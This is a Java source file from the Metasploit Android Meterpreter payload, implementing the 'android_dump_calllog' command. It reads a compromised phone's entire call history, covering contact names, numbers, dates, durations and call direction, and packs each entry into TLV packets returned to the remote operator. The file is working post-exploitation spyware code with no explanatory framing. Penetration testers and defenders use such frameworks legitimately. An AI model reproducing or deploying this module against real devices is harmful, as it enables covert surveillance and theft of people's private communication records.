package com.metasploit.meterpreter.android;

import java.util.Date;

import android.database.Cursor;
import android.provider.CallLog;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class android_dump_calllog implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_CALLLOG_NAME = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9013);
    private static final int TLV_TYPE_CALLLOG_TYPE = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9014);
    private static final int TLV_TYPE_CALLLOG_DATE = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9015);
    private static final int TLV_TYPE_CALLLOG_DURATION = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9016);
    private static final int TLV_TYPE_CALLLOG_GROUP = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9017);
    private static final int TLV_TYPE_CALLLOG_NUMBER = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9018);
    private static final String unknown = "Unknown";
    private static final String outgoing = "OUTGOING";
    private static final String incoming = "INCOMING";
    private static final String missed = "MISSED";

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
                       TLVPacket response) throws Exception {

        Cursor cur = AndroidMeterpreter.getContext().getContentResolver()
                .query(CallLog.Calls.CONTENT_URI, null, null, null, null);

        int number = cur.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cur.getColumnIndex(CallLog.Calls.TYPE);
        int date = cur.getColumnIndex(CallLog.Calls.DATE);
        int duration = cur.getColumnIndex(CallLog.Calls.DURATION);
        int name = cur.getColumnIndex(CallLog.Calls.CACHED_NAME);

        while (cur.moveToNext()) {
            TLVPacket pckt = new TLVPacket();

            pckt.addOverflow(TLV_TYPE_CALLLOG_NAME, cur.getString(name));
            pckt.addOverflow(TLV_TYPE_CALLLOG_NUMBER, cur.getString(number));
            pckt.addOverflow(TLV_TYPE_CALLLOG_DURATION, cur.getString(duration));

            String callDate = cur.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));

            pckt.addOverflow(TLV_TYPE_CALLLOG_DATE, callDayTime.toString());

            String callType = cur.getString(type);
            String dir = unknown;

            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = outgoing;
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = incoming;
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = missed;
                    break;
            }
            pckt.addOverflow(TLV_TYPE_CALLLOG_TYPE, dir);
            response.addOverflow(TLV_TYPE_CALLLOG_GROUP, pckt);
        }

        cur.close();

        return ERROR_SUCCESS;
    }

}
